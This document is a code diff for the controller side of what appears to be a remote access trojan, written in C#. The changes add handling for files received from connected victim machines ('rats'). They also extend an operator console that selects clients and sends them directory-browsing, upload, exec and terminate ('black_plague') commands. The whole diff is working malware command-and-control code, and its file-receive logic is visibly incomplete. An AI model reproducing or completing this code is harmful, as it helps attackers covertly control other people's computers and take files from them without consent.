@@ -1,9 +1,11 @@
 ﻿using System;
 using System.Text;
+using System.IO;
 using System.Net;
 using System.Net.Sockets;
 using System.Threading;
 using System.Collections.Generic;
+using System.Diagnostics;
 
 /**
  * [ ] Have the option to communicate with either 1 or all connected clients.
@@ -15,6 +17,9 @@ namespace da_pak
     class Pak
     {
         private static byte[] _buffer = new byte[2048];
+
+        private static ManualResetEvent _mre = new ManualResetEvent(false);
+
         private static List<Socket> _clientSockets = new List<Socket>();
         private static List<Rat> _rats = new List<Rat>();
         private static Socket _serverSocket = new Socket
@@ -33,8 +38,8 @@ namespace da_pak
             private string hostAddr;
 
             private static int n = 0;
-            private static int ratN;
             public bool selected = false;
+            public int ratN;
 
             public Rat(Socket sock, string info)
             {
@@ -47,6 +52,21 @@ namespace da_pak
                 ratN = n;
                 n += 1;
             }
+
+            public static Rat getRatBySock(Socket sok)
+            {
+                foreach (var rat in _rats)
+                    if (sok == rat.hostSock)
+                        return rat;
+                return null;
+            }
+
+            public static string daRatSays(string message, Rat rat)
+            {
+                return "Rat[" + rat.ratN + "]: " + message;
+            } 
+            public static string daRatSays(string message, Socket sok) { return daRatSays(message, getRatBySock(sok)); }
+
 
             public override string ToString()
             {
@@ -63,7 +83,7 @@ namespace da_pak
             SendLoop();
 
             Console.WriteLine("Exiting...");
-            Console.ReadLine();
+            // Console.ReadLine();
         }
 
         private static void SetupServer()
@@ -81,10 +101,10 @@ namespace da_pak
 
             _clientSockets.Add(socket);
             puts("Client connected...");
-            
+
             socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);
-            
-            _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
+
+            _mre.WaitOne();
         }
 
         private static void ReceiveCallback(IAsyncResult AR)
@@ -93,32 +113,49 @@ namespace da_pak
             
             try
             {
-                int received = socket.EndReceive(AR);
-
-                byte[] dataBuf = new byte[received];
-                Array.Copy(_buffer, dataBuf, received);
-
-                string text = Encoding.ASCII.GetString(dataBuf);
-
-                string response = string.Empty;
-                if (text.ToLower().Split()[0] == "info")
+                if (socket.Connected)
                 {
-                    _rats.Add( new Rat(socket, text) );
-                    response = "Rat added to the pak";
-                    byte[] data = Encoding.ASCII.GetBytes(response);
-                    socket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
-                }
+                    int received = socket.EndReceive(AR);
 
-                socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);
+                    byte[] dataBuf = new byte[received];
+                    Array.Copy(_buffer, dataBuf, received);
+
+                    string text = Encoding.ASCII.GetString(dataBuf);
+                    
+                    string response = string.Empty;
+                    if (text.ToLower().Split()[0] == "info")
+                    {
+                        _rats.Add( new Rat(socket, text) );
+                        response = "INFO Rat added to the pak";
+
+                        text = text.Insert(0, "Client connected... ");
+
+                        SendMessage(response, socket, false);
+                    }
+                    else if (text.ToLower().Split()[0] == "file" && text.ToLower().Split()[3] != "empty")
+                    {
+                        /* FILE fileName headerSize ... */
+                        string fileName = text.ToLower().Split()[1]; 
+                        int headerSize = Convert.ToInt32(text.ToLower().Split()[2]);
+                        
+                        text = text.Remove(0, headerSize);
+                        File.Create( Directory.GetCurrentDirectory() + fileName );
+
+                        text = fileName + " was download locally.";
+                    }
+                    
+                    puts( Rat.daRatSays(text, socket) );
+
+                    socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);
+
+                    _mre.Set();
+                }
             }
             catch (SocketException)
             {
                 puts("Client disconnected...");
 
-                /** I could keep the rat and add a bool disconnected
-                 * and handle the rat at a later time,
-                 * but that is not in the scope of v0.1
-                 */
+                socket.Close();
                 _clientSockets.Remove(socket);
 
                 Rat toBeRemoved = null;
@@ -126,6 +163,8 @@ namespace da_pak
                     if (socket == rat.hostSock)
                         toBeRemoved = rat;
                 if (_rats.Contains(toBeRemoved)) _rats.Remove(toBeRemoved);
+
+                _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
             }
         }
 
@@ -135,31 +174,37 @@ namespace da_pak
             socket.EndSend(AR);
         }
 
-        private static void SendMessage(string message, Rat rat)
+        private static void SendMessage(string message, Socket sok, bool receive = true)
         {
             byte[] data = Encoding.ASCII.GetBytes(message);
-            rat.hostSock.BeginSend(data, 0, data.Length, SocketFlags.None,
-                                new AsyncCallback(SendCallback), rat.hostSock);
+            sok.BeginSend(data, 0, data.Length, SocketFlags.None,
+                                new AsyncCallback(SendCallback), sok);
             
-            rat.hostSock.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None,
-                                new AsyncCallback(ReceiveCallback), rat.hostSock);
+            if (receive)
+                sok.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None,
+                                    new AsyncCallback(ReceiveCallback), sok);
         }
+        private static void SendMessage(string message, Rat rat, bool receive = true) { SendMessage(message, rat.hostSock, receive); }
 
         private static string _help = @"
 Commands:
 
-list `or` rats          display clients
+    list `or` rats          display clients
 
-rat {no}                select a client to broadcast to
-rat                     deselect client (broadcast to / select all)
+    rat {no}                select a client to broadcast to
+    rat                     deselect client (broadcast to / select all)
 
-dir                     display directory of the selected rat(s)
-cd                      navigate the directory of the selected rat(s)
+    dir                     display directory of the selected rat(s)
+    cd {dir}                navigate the directory of the selected rat(s)
 
-kill                    send terminate command to the selected rat(s)
+    exec                    execute (tb.implemented)
+    upload {fileName}       upload a localFile to the selected rat(s) 
 
-help                    display help
-break `or` exit         exit
+    kill                    send terminate command to the selected rat(s)
+
+    help                    display help
+
+    break `or` exit         exit
 
 ";
         private static void SendLoop()
@@ -189,19 +234,26 @@ break `or` exit         exit
                         theChosenOne = _rats[ Convert.ToInt32(input.Split()[1]) ];
                         theChosenOne.selected = true;
                     }
+                    else
+                        puts("Rat not found");
                 }
-
-                /* Send message to either only one or to all rats */
-                if (theChosenOne == null)
-                    foreach(var rat in _rats)
-                        SendMessage(input, rat);
-
                 else
                 {
-                    SendMessage(input, theChosenOne);
+                    /* Send message to either only one or to all rats */
+                    if (theChosenOne == null)
+                        foreach(var rat in _rats)
+                            SendMessage(input, rat);
 
-                    if (input == "kill")
-                        theChosenOne = null;
+                    else
+                    {
+                        SendMessage(input, theChosenOne);
+
+                        if (input == "kill" || input == "black_plague" || input == "terminate")
+                            theChosenOne = null;
+                    }
+
+                    if (input == "black_plague" || input == "terminate")
+                        Environment.Exit(0);
                 }
             }
         }
